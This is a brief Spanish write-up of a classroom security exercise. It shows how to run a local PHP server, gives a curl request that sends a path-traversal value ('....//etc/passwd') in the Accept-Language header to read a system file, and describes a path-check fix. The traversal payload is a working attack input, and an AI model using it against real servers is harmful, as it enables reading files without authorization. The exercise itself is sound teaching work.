# Ejercicio 4

Comando para correr el server

`php -S localhost:8000`

Query para aprovecharse del server

`curl http://localhost:8000/server.php -H "Accept-Language: ....//etc/passwd"`


El fix es chequear que el `$path` resultante sea igual al `$path` absoluto del archivo. Como las cosas viven dentro del directorio `/lang`, tenemos asegurado que no escaparemos de alli.
